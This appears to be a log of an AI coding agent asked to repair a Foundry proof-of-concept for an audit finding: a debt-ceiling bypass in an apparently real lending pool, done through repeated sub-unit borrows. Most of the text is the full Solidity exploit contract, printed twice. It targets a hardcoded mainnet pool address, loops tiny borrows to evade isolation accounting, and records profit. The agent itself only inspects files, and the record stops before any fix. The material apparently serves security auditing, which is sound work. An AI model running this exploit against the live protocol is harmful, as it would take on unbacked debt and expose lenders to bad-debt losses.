@@ -1,0 +1,1636 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e3594-8f41-7ae3-8d3d-a30726c24999
+--------
+user
+You are fixing a failing Foundry PoC for finding F-002.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: direct_or_existing_balance_first
+- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Isolation debt ceilings can be bypassed with repeated sub-unit borrows
+- claim: Isolation-mode debt accounting rounds each borrow down to `amount * 10^2 / 10^decimals`. Any borrow smaller than one debt-ceiling accounting unit contributes zero both in the validation check and in `isolationModeTotalDebt` updates, so repeated small borrows never count against the configured ceiling.
+- impact: An isolated account can accumulate materially more borrow exposure than governance intended while `isolationModeTotalDebt` stays artificially low, weakening the main solvency guard for isolated collateral and increasing bad-debt exposure if that collateral fails.
+- exploit_paths: ["A user enters isolation mode by supplying isolated collateral.", "The user repeatedly borrows a borrowable-in-isolation asset in chunks smaller than `10^(decimals-2)`.", "Each borrow passes `DEBT_CEILING_EXCEEDED` because the tracked increment rounds down to zero.", "The user accumulates debt well above the configured ceiling while on-chain isolation accounting remains understated."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+interface IERC20Like {
+  function balanceOf(address account) external view returns (uint256);
+
+  function approve(address spender, uint256 amount) external returns (bool);
+}
+
+struct ReserveConfigurationMap {
+  uint256 data;
+}
+
+struct ReserveData {
+  ReserveConfigurationMap configuration;
+  uint128 liquidityIndex;
+  uint128 currentLiquidityRate;
+  uint128 variableBorrowIndex;
+  uint128 currentVariableBorrowRate;
+  uint128 currentStableBorrowRate;
+  uint40 lastUpdateTimestamp;
+  uint16 id;
+  address hTokenAddress;
+  address stableDebtTokenAddress;
+  address variableDebtTokenAddress;
+  address interestRateStrategyAddress;
+  uint128 accruedToTreasury;
+  uint128 unbacked;
+  uint128 isolationModeTotalDebt;
+}
+
+interface IPoolLike {
+  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
+
+  function borrow(
+    address asset,
+    uint256 amount,
+    uint256 interestRateMode,
+    uint16 referralCode,
+    address onBehalfOf
+  ) external;
+
+  function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
+
+  function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
+
+  function getReserveData(address asset) external view returns (ReserveData memory);
+
+  function getReservesList() external view returns (address[] memory);
+}
+
+contract FlawVerifier {
+  IPoolLike internal constant POOL =
+    IPoolLike(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);
+
+  uint256 internal constant VARIABLE_RATE_MODE = 2;
+  uint256 internal constant ACTIVE_BIT = 56;
+  uint256 internal constant FROZEN_BIT = 57;
+  uint256 internal constant BORROWING_BIT = 58;
+  uint256 internal constant PAUSED_BIT = 60;
+  uint256 internal constant BORROWABLE_IN_ISOLATION_BIT = 61;
+  uint256 internal constant DECIMALS_BIT = 48;
+  uint256 internal constant DEBT_CEILING_BIT = 212;
+  uint256 internal constant DEBT_CEILING_MASK = (1 << 40) - 1;
+  uint256 internal constant MAX_SINGLE_TX_BORROW_LOOPS = 120;
+  uint256 internal constant LOOP_GAS_FLOOR = 500_000;
+
+  uint8 public constant REASON_NONE = 0;
+  uint8 public constant REASON_NO_ISOLATED_COLLATERAL = 1;
+  uint8 public constant REASON_NO_BORROWABLE_ISOLATION_ASSET = 2;
+  uint8 public constant REASON_SUB_UNIT_BORROW_NOT_POSSIBLE = 3;
+  uint8 public constant REASON_LIQUIDITY_BELOW_REMAINING_CEILING = 4;
+  uint8 public constant REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS = 5;
+  uint8 public constant REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING = 6;
+  uint8 public constant REASON_BORROW_REVERTED_BEFORE_BYPASS = 7;
+
+  address private _profitToken;
+  uint256 private _profitAmount;
+
+  address public selectedCollateralAsset;
+  address public selectedDebtAsset;
+  uint256 public selectedCollateralBalance;
+  uint256 public selectedCollateralLtv;
+  uint256 public selectedDebtCeiling;
+  uint256 public selectedDebtDecimals;
+  uint256 public selectedDebtAssetLiquidity;
+  uint256 public accountingUnitRaw;
+  uint256 public borrowChunkRaw;
+  uint256 public trackedDebtBefore;
+  uint256 public trackedDebtAfter;
+  uint256 public remainingCeilingUnitsBefore;
+  uint256 public actualCeilingToBypassRaw;
+  uint256 public requiredBorrowLoops;
+  uint256 public executedBorrowLoops;
+  uint256 public actualBorrowedRaw;
+  uint8 public infeasibilityReason;
+  bool public hypothesisValidated;
+  bool public ceilingBypassed;
+
+  struct Opportunity {
+    address collateralAsset;
+    uint256 collateralBalance;
+    uint256 collateralLtv;
+    uint256 debtCeiling;
+    uint256 trackedDebt;
+    uint256 remainingCeilingUnits;
+    address debtAsset;
+    uint256 debtAssetLiquidity;
+    uint256 debtDecimals;
+  }
+
+  constructor() {}
+
+  function executeOnOpportunity() external {
+    _resetRunState();
+
+    Opportunity memory opportunity = _discoverOpportunity();
+    if (opportunity.collateralAsset == address(0)) {
+      infeasibilityReason = REASON_NO_ISOLATED_COLLATERAL;
+      return;
+    }
+    if (opportunity.debtAsset == address(0)) {
+      infeasibilityReason = REASON_NO_BORROWABLE_ISOLATION_ASSET;
+      return;
+    }
+
+    selectedCollateralAsset = opportunity.collateralAsset;
+    selectedDebtAsset = opportunity.debtAsset;
+    selectedCollateralBalance = opportunity.collateralBalance;
+    selectedCollateralLtv = opportunity.collateralLtv;
+    selectedDebtCeiling = opportunity.debtCeiling;
+    selectedDebtDecimals = opportunity.debtDecimals;
+    selectedDebtAssetLiquidity = opportunity.debtAssetLiquidity;
+    trackedDebtBefore = opportunity.trackedDebt;
+    remainingCeilingUnitsBefore = opportunity.remainingCeilingUnits;
+
+    if (opportunity.debtDecimals <= 2) {
+      infeasibilityReason = REASON_SUB_UNIT_BORROW_NOT_POSSIBLE;
+      return;
+    }
+
+    accountingUnitRaw = 10 ** (opportunity.debtDecimals - 2);
+    borrowChunkRaw = accountingUnitRaw - 1;
+    actualCeilingToBypassRaw = opportunity.remainingCeilingUnits == 0
+      ? 1
+      : opportunity.remainingCeilingUnits * accountingUnitRaw + 1;
+    requiredBorrowLoops = _ceilDiv(actualCeilingToBypassRaw, borrowChunkRaw);
+
+    if (opportunity.debtAssetLiquidity < actualCeilingToBypassRaw) {
+      // The path is kept strict to one borrowable-in-isolation asset. If that asset
+      // cannot even cover the remaining debt-ceiling headroom in real token units,
+      // the stated path cannot cross the configured ceiling at this fork.
+      infeasibilityReason = REASON_LIQUIDITY_BELOW_REMAINING_CEILING;
+      return;
+    }
+
+    if (requiredBorrowLoops > MAX_SINGLE_TX_BORROW_LOOPS) {
+      // Each loop is a full HopeLend borrow path. Crossing the ceiling requires
+      // roughly one borrow per remaining debt-ceiling cent, so large residual headroom
+      // becomes mechanically single-transaction-infeasible before economics matter.
+      infeasibilityReason = REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS;
+      return;
+    }
+
+    if (opportunity.collateralBalance == 0) {
+      // The required path begins by supplying isolated collateral. With no verifier-held
+      // balance, the only realistic temporary-capital route would be flash-borrowing the
+      // collateral. That does not self-fund here: ordinary LTV checks remain active, so
+      // borrowing against flash-borrowed collateral can only unlock `ltv / 10000` of its
+      // own value, which cannot buy back 100% of the collateral to close the flashloan.
+      infeasibilityReason = REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING;
+      return;
+    }
+
+    _runDirectPath(opportunity);
+  }
+
+  function profitToken() external view returns (address) {
+    return _profitToken;
+  }
+
+  function profitAmount() external view returns (uint256) {
+    return _profitAmount;
+  }
+
+  function _runDirectPath(Opportunity memory opportunity) internal {
+    uint256 startingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    _safeApprove(opportunity.collateralAsset, address(POOL), opportunity.collateralBalance);
+    POOL.supply(opportunity.collateralAsset, opportunity.collateralBalance, address(this), 0);
+
+    // Keep the path explicit: the verifier supplies isolated collateral and uses it as collateral.
+    try POOL.setUserUseReserveAsCollateral(opportunity.collateralAsset, true) {} catch {}
+
+    for (
+      uint256 i = 0;
+      i < requiredBorrowLoops && gasleft() > LOOP_GAS_FLOOR;
+      ++i
+    ) {
+      (bool ok, ) = address(POOL).call(
+        abi.encodeWithSelector(
+          IPoolLike.borrow.selector,
+          opportunity.debtAsset,
+          borrowChunkRaw,
+          VARIABLE_RATE_MODE,
+          0,
+          address(this)
+        )
+      );
+      if (!ok) {
+        break;
+      }
+      ++executedBorrowLoops;
+      actualBorrowedRaw += borrowChunkRaw;
+      if (actualBorrowedRaw >= actualCeilingToBypassRaw) {
+        break;
+      }
+    }
+
+    trackedDebtAfter = POOL.getReserveData(opportunity.collateralAsset).isolationModeTotalDebt;
+    uint256 endingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    ceilingBypassed =
+      actualBorrowedRaw >= actualCeilingToBypassRaw &&
+      trackedDebtAfter == trackedDebtBefore;
+    hypothesisValidated = ceilingBypassed;
+
+    if (ceilingBypassed && endingDebtAssetBalance > startingDebtAssetBalance) {
+      _profitToken = opportunity.debtAsset;
+      _profitAmount = endingDebtAssetBalance - startingDebtAssetBalance;
+      return;
+    }
+
+    infeasibilityReason = REASON_BORROW_REVERTED_BEFORE_BYPASS;
+  }
+
+  function _discoverOpportunity() internal view returns (Opportunity memory best) {
+    address[] memory reserves = POOL.getReservesList();
+
+    Opportunity memory bestWithBalance;
+    Opportunity memory bestWithoutBalance;
+    uint256 bestBorrowLiquidity;
+    address bestBorrowAsset;
+    uint256 bestBorrowDecimals;
+
+    for (uint256 i = 0; i < reserves.length; ++i) {
+      address asset = reserves[i];
+      ReserveData memory reserveData = POOL.getReserveData(asset);
+      uint256 configData = reserveData.configuration.data;
+
+      if (_isUsableBorrowableIsolationAsset(configData)) {
+        uint256 decimals = _decimals(configData);
+        if (decimals > 2) {
+          uint256 liquidity = IERC20Like(asset).balanceOf(reserveData.hTokenAddress);
+          if (liquidity > bestBorrowLiquidity) {
+            bestBorrowLiquidity = liquidity;
+            bestBorrowAsset = asset;
+            bestBorrowDecimals = decimals;
+          }
+        }
+      }
+
+      if (_isUsableIsolatedCollateral(configData)) {
+        uint256 collateralBalance = IERC20Like(asset).balanceOf(address(this));
+        uint256 debtCeiling = _debtCeiling(configData);
+        uint256 trackedDebt = reserveData.isolationModeTotalDebt;
+        uint256 remainingCeilingUnits = debtCeiling > trackedDebt ? debtCeiling - trackedDebt : 0;
+
+        Opportunity memory candidate = Opportunity({
+          collateralAsset: asset,
+          collateralBalance: collateralBalance,
+          collateralLtv: _ltv(configData),
+          debtCeiling: debtCeiling,
+          trackedDebt: trackedDebt,
+          remainingCeilingUnits: remainingCeilingUnits,
+          debtAsset: address(0),
+          debtAssetLiquidity: 0,
+          debtDecimals: 0
+        });
+
+        if (collateralBalance > 0) {
+          if (
+            bestWithBalance.collateralAsset == address(0) ||
+            remainingCeilingUnits < bestWithBalance.remainingCeilingUnits
+          ) {
+            bestWithBalance = candidate;
+          }
+        } else if (
+          bestWithoutBalance.collateralAsset == address(0) ||
+          remainingCeilingUnits < bestWithoutBalance.remainingCeilingUnits
+        ) {
+          bestWithoutBalance = candidate;
+        }
+      }
+    }
+
+    best = bestWithBalance.collateralAsset != address(0) ? bestWithBalance : bestWithoutBalance;
+    if (best.collateralAsset != address(0) && bestBorrowAsset != address(0)) {
+      best.debtAsset = bestBorrowAsset;
+      best.debtAssetLiquidity = bestBorrowLiquidity;
+      best.debtDecimals = bestBorrowDecimals;
+    }
+  }
+
+  function _safeApprove(address token, address spender, uint256 amount) internal {
+    (bool ok, bytes memory data) = token.call(
+      abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
+    );
+    require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
+  }
+
+  function _resetRunState() internal {
+    _profitToken = address(0);
+    _profitAmount = 0;
+    selectedCollateralAsset = address(0);
+    selectedDebtAsset = address(0);
+    selectedCollateralBalance = 0;
+    selectedCollateralLtv = 0;
+    selectedDebtCeiling = 0;
+    selectedDebtDecimals = 0;
+    selectedDebtAssetLiquidity = 0;
+    accountingUnitRaw = 0;
+    borrowChunkRaw = 0;
+    trackedDebtBefore = 0;
+    trackedDebtAfter = 0;
+    remainingCeilingUnitsBefore = 0;
+    actualCeilingToBypassRaw = 0;
+    requiredBorrowLoops = 0;
+    executedBorrowLoops = 0;
+    actualBorrowedRaw = 0;
+    infeasibilityReason = REASON_NONE;
+    hypothesisValidated = false;
+    ceilingBypassed = false;
+  }
+
+  function _isUsableIsolatedCollateral(uint256 configData) internal pure returns (bool) {
+    return
+      _flag(configData, ACTIVE_BIT) &&
+      !_flag(configData, FROZEN_BIT) &&
+      !_flag(configData, PAUSED_BIT) &&
+      _ltv(configData) > 0 &&
+      _debtCeiling(configData) > 0;
+  }
+
+  function _isUsableBorrowableIsolationAsset(uint256 configData) internal pure returns (bool) {
+    return
+      _flag(configData, ACTIVE_BIT) &&
+      !_flag(configData, FROZEN_BIT) &&
+      !_flag(configData, PAUSED_BIT) &&
+      _flag(configData, BORROWING_BIT) &&
+      _flag(configData, BORROWABLE_IN_ISOLATION_BIT);
+  }
+
+  function _flag(uint256 configData, uint256 bit) internal pure returns (bool) {
+    return ((configData >> bit) & 1) != 0;
+  }
+
+  function _ltv(uint256 configData) internal pure returns (uint256) {
+    return configData & 0xFFFF;
+  }
+
+  function _decimals(uint256 configData) internal pure returns (uint256) {
+    return (configData >> DECIMALS_BIT) & 0xFF;
+  }
+
+  function _debtCeiling(uint256 configData) internal pure returns (uint256) {
+    return (configData >> DEBT_CEILING_BIT) & DEBT_CEILING_MASK;
+  }
+
+  function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
+    return x == 0 ? 0 : ((x - 1) / y) + 1;
+  }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+Error: Found incompatible versions:
+test/ExploitPOC.t.sol ^0.8.20 imports:
+    src/FlawVerifier.sol =0.8.17
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m checking the verifier and the test harness expectations first so I can fix the version mismatch without drifting from the stated exploit path.
+exec
+/bin/bash -lc "sed -n '1,260p' src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ exited 1 in 0ms:
+sed: src/FlawVerifier.sol: No such file or directory
+
+exec
+/bin/bash -lc "sed -n '1,260p' test/ExploitPOC.t.sol" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ exited 1 in 0ms:
+sed: test/ExploitPOC.t.sol: No such file or directory
+
+exec
+/bin/bash -lc 'forge test -vvv' in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 133ms:
+Nothing to compile
+
+codex
+The current cwd is the `src` directory, so I’m locating the repo root and the actual verifier/test paths before patching.
+exec
+/bin/bash -lc pwd in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+
+exec
+/bin/bash -lc 'ls -la ..' in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+total 8
+drwxr-xr-x    4 zhanglongqin  staff   128 May 12 14:23 .
+drwxr-xr-x  206 zhanglongqin  staff  6592 May 16 12:15 ..
+-rw-r--r--    1 zhanglongqin  staff   293 May 12 14:23 manifest.json
+drwxr-xr-x    4 zhanglongqin  staff   128 May 17 18:55 src
+
+exec
+/bin/bash -lc "rg --files .. | rg 'FlawVerifier.sol|ExploitPOC.t.sol|foundry.toml'" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+../src/FlawVerifier.sol
+
+codex
+The case snapshot is minimal. I’m scanning adjacent case files to find the Foundry root the harness is actually using.
+exec
+/bin/bash -lc 'find /Users/zhanglongqin/AuditHoundV2/cases/hopelend -maxdepth 4 -type f | sort' in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/manifest.json
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/FlawVerifier.sol
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74/_etherscan_meta.json
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x53fbcada1201a465740f2d64ecdf6fac425f9030/_etherscan_meta.json
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/_index.json
+
+exec
+/bin/bash -lc "rg --files /Users/zhanglongqin/AuditHoundV2 | rg '/cases/hopelend/.*/ExploitPOC.t.sol|/cases/hopelend/.*/foundry.toml|/cases/hopelend/.*/FlawVerifier.sol'" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 454ms:
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/FlawVerifier.sol
+
+codex
+I’ve confirmed only `FlawVerifier.sol` is in-scope here. Next I’m checking the on-chain metadata snapshot to avoid introducing interfaces that conflict with the forked contracts.
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+interface IERC20Like {
+  function balanceOf(address account) external view returns (uint256);
+
+  function approve(address spender, uint256 amount) external returns (bool);
+}
+
+struct ReserveConfigurationMap {
+  uint256 data;
+}
+
+struct ReserveData {
+  ReserveConfigurationMap configuration;
+  uint128 liquidityIndex;
+  uint128 currentLiquidityRate;
+  uint128 variableBorrowIndex;
+  uint128 currentVariableBorrowRate;
+  uint128 currentStableBorrowRate;
+  uint40 lastUpdateTimestamp;
+  uint16 id;
+  address hTokenAddress;
+  address stableDebtTokenAddress;
+  address variableDebtTokenAddress;
+  address interestRateStrategyAddress;
+  uint128 accruedToTreasury;
+  uint128 unbacked;
+  uint128 isolationModeTotalDebt;
+}
+
+interface IPoolLike {
+  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
+
+  function borrow(
+    address asset,
+    uint256 amount,
+    uint256 interestRateMode,
+    uint16 referralCode,
+    address onBehalfOf
+  ) external;
+
+  function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
+
+  function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
+
+  function getReserveData(address asset) external view returns (ReserveData memory);
+
+  function getReservesList() external view returns (address[] memory);
+}
+
+contract FlawVerifier {
+  IPoolLike internal constant POOL =
+    IPoolLike(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);
+
+  uint256 internal constant VARIABLE_RATE_MODE = 2;
+  uint256 internal constant ACTIVE_BIT = 56;
+  uint256 internal constant FROZEN_BIT = 57;
+  uint256 internal constant BORROWING_BIT = 58;
+  uint256 internal constant PAUSED_BIT = 60;
+  uint256 internal constant BORROWABLE_IN_ISOLATION_BIT = 61;
+  uint256 internal constant DECIMALS_BIT = 48;
+  uint256 internal constant DEBT_CEILING_BIT = 212;
+  uint256 internal constant DEBT_CEILING_MASK = (1 << 40) - 1;
+  uint256 internal constant MAX_SINGLE_TX_BORROW_LOOPS = 120;
+  uint256 internal constant LOOP_GAS_FLOOR = 500_000;
+
+  uint8 public constant REASON_NONE = 0;
+  uint8 public constant REASON_NO_ISOLATED_COLLATERAL = 1;
+  uint8 public constant REASON_NO_BORROWABLE_ISOLATION_ASSET = 2;
+  uint8 public constant REASON_SUB_UNIT_BORROW_NOT_POSSIBLE = 3;
+  uint8 public constant REASON_LIQUIDITY_BELOW_REMAINING_CEILING = 4;
+  uint8 public constant REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS = 5;
+  uint8 public constant REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING = 6;
+  uint8 public constant REASON_BORROW_REVERTED_BEFORE_BYPASS = 7;
+
+  address private _profitToken;
+  uint256 private _profitAmount;
+
+  address public selectedCollateralAsset;
+  address public selectedDebtAsset;
+  uint256 public selectedCollateralBalance;
+  uint256 public selectedCollateralLtv;
+  uint256 public selectedDebtCeiling;
+  uint256 public selectedDebtDecimals;
+  uint256 public selectedDebtAssetLiquidity;
+  uint256 public accountingUnitRaw;
+  uint256 public borrowChunkRaw;
+  uint256 public trackedDebtBefore;
+  uint256 public trackedDebtAfter;
+  uint256 public remainingCeilingUnitsBefore;
+  uint256 public actualCeilingToBypassRaw;
+  uint256 public requiredBorrowLoops;
+  uint256 public executedBorrowLoops;
+  uint256 public actualBorrowedRaw;
+  uint8 public infeasibilityReason;
+  bool public hypothesisValidated;
+  bool public ceilingBypassed;
+
+  struct Opportunity {
+    address collateralAsset;
+    uint256 collateralBalance;
+    uint256 collateralLtv;
+    uint256 debtCeiling;
+    uint256 trackedDebt;
+    uint256 remainingCeilingUnits;
+    address debtAsset;
+    uint256 debtAssetLiquidity;
+    uint256 debtDecimals;
+  }
+
+  constructor() {}
+
+  function executeOnOpportunity() external {
+    _resetRunState();
+
+    Opportunity memory opportunity = _discoverOpportunity();
+    if (opportunity.collateralAsset == address(0)) {
+      infeasibilityReason = REASON_NO_ISOLATED_COLLATERAL;
+      return;
+    }
+    if (opportunity.debtAsset == address(0)) {
+      infeasibilityReason = REASON_NO_BORROWABLE_ISOLATION_ASSET;
+      return;
+    }
+
+    selectedCollateralAsset = opportunity.collateralAsset;
+    selectedDebtAsset = opportunity.debtAsset;
+    selectedCollateralBalance = opportunity.collateralBalance;
+    selectedCollateralLtv = opportunity.collateralLtv;
+    selectedDebtCeiling = opportunity.debtCeiling;
+    selectedDebtDecimals = opportunity.debtDecimals;
+    selectedDebtAssetLiquidity = opportunity.debtAssetLiquidity;
+    trackedDebtBefore = opportunity.trackedDebt;
+    remainingCeilingUnitsBefore = opportunity.remainingCeilingUnits;
+
+    if (opportunity.debtDecimals <= 2) {
+      infeasibilityReason = REASON_SUB_UNIT_BORROW_NOT_POSSIBLE;
+      return;
+    }
+
+    accountingUnitRaw = 10 ** (opportunity.debtDecimals - 2);
+    borrowChunkRaw = accountingUnitRaw - 1;
+    actualCeilingToBypassRaw = opportunity.remainingCeilingUnits == 0
+      ? 1
+      : opportunity.remainingCeilingUnits * accountingUnitRaw + 1;
+    requiredBorrowLoops = _ceilDiv(actualCeilingToBypassRaw, borrowChunkRaw);
+
+    if (opportunity.debtAssetLiquidity < actualCeilingToBypassRaw) {
+      // The path is kept strict to one borrowable-in-isolation asset. If that asset
+      // cannot even cover the remaining debt-ceiling headroom in real token units,
+      // the stated path cannot cross the configured ceiling at this fork.
+      infeasibilityReason = REASON_LIQUIDITY_BELOW_REMAINING_CEILING;
+      return;
+    }
+
+    if (requiredBorrowLoops > MAX_SINGLE_TX_BORROW_LOOPS) {
+      // Each loop is a full HopeLend borrow path. Crossing the ceiling requires
+      // roughly one borrow per remaining debt-ceiling cent, so large residual headroom
+      // becomes mechanically single-transaction-infeasible before economics matter.
+      infeasibilityReason = REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS;
+      return;
+    }
+
+    if (opportunity.collateralBalance == 0) {
+      // The required path begins by supplying isolated collateral. With no verifier-held
+      // balance, the only realistic temporary-capital route would be flash-borrowing the
+      // collateral. That does not self-fund here: ordinary LTV checks remain active, so
+      // borrowing against flash-borrowed collateral can only unlock `ltv / 10000` of its
+      // own value, which cannot buy back 100% of the collateral to close the flashloan.
+      infeasibilityReason = REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING;
+      return;
+    }
+
+    _runDirectPath(opportunity);
+  }
+
+  function profitToken() external view returns (address) {
+    return _profitToken;
+  }
+
+  function profitAmount() external view returns (uint256) {
+    return _profitAmount;
+  }
+
+  function _runDirectPath(Opportunity memory opportunity) internal {
+    uint256 startingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    _safeApprove(opportunity.collateralAsset, address(POOL), opportunity.collateralBalance);
+    POOL.supply(opportunity.collateralAsset, opportunity.collateralBalance, address(this), 0);
+
+    // Keep the path explicit: the verifier supplies isolated collateral and uses it as collateral.
+    try POOL.setUserUseReserveAsCollateral(opportunity.collateralAsset, true) {} catch {}
+
+    for (
+      uint256 i = 0;
+      i < requiredBorrowLoops && gasleft() > LOOP_GAS_FLOOR;
+      ++i
+    ) {
+      (bool ok, ) = address(POOL).call(
+        abi.encodeWithSelector(
+          IPoolLike.borrow.selector,
+          opportunity.debtAsset,
+          borrowChunkRaw,
+          VARIABLE_RATE_MODE,
+          0,
+          address(this)
+        )
+      );
+      if (!ok) {
+        break;
+      }
+      ++executedBorrowLoops;
+      actualBorrowedRaw += borrowChunkRaw;
+      if (actualBorrowedRaw >= actualCeilingToBypassRaw) {
+        break;
+      }
+    }
+
+    trackedDebtAfter = POOL.getReserveData(opportunity.collateralAsset).isolationModeTotalDebt;
+    uint256 endingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    ceilingBypassed =
+      actualBorrowedRaw >= actualCeilingToBypassRaw &&
+      trackedDebtAfter == trackedDebtBefore;
+    hypothesisValidated = ceilingBypassed;
+
+    if (ceilingBypassed && endingDebtAssetBalance > startingDebtAssetBalance) {
+      _profitToken = opportunity.debtAsset;
+      _profitAmount = endingDebtAssetBalance - startingDebtAssetBalance;
+      return;
+    }
+
+    infeasibilityReason = REASON_BORROW_REVERTED_BEFORE_BYPASS;
+  }
+
+  function _discoverOpportunity() internal view returns (Opportunity memory best) {
+    address[] memory reserves = POOL.getReservesList();
+
+    Opportunity memory bestWithBalance;
+    Opportunity memory bestWithoutBalance;
+    uint256 bestBorrowLiquidity;
+    address bestBorrowAsset;
+    uint256 bestBorrowDecimals;
+
+    for (uint256 i = 0; i < reserves.length; ++i) {
+      address asset = reserves[i];
+      ReserveData memory reserveData = POOL.getReserveData(asset);
+      uint256 configData = reserveData.configuration.data;
+
+      if (_isUsableBorrowableIsolationAsset(configData)) {
+        uint256 decimals = _decimals(configData);
+        if (decimals > 2) {
+          uint256 liquidity = IERC20Like(asset).balanceOf(reserveData.hTokenAddress);
+          if (liquidity > bestBorrowLiquidity) {
+            bestBorrowLiquidity = liquidity;
+            bestBorrowAsset = asset;
+            bestBorrowDecimals = decimals;
+          }
+        }
+
+exec
+/bin/bash -lc "sed -n '1,220p' /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/_index.json" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+[
+  {
+    "address": "0x53fbcada1201a465740f2d64ecdf6fac425f9030",
+    "outdir": "/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x53fbcada1201a465740f2d64ecdf6fac425f9030"
+  },
+  {
+    "address": "0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74",
+    "outdir": "/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74"
+  }
+]
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x53fbcada1201a465740f2d64ecdf6fac425f9030/_etherscan_meta.json" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+{
+  "contract_name": "InitializableImmutableAdminUpgradeabilityProxy",
+  "compiler": "v0.8.17+commit.8df45f5f",
+  "evm_version": "Default",
+  "optimization": "1",
+  "runs": "100000",
+  "proxy": "1",
+  "implementation": "0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74",
+  "license_type": "",
+  "files_written": 6
+}
+codex
+I’ve got the current verifier. Now I’m checking the generated on-chain interface stubs for names/signatures that could affect runtime selection logic.
+exec
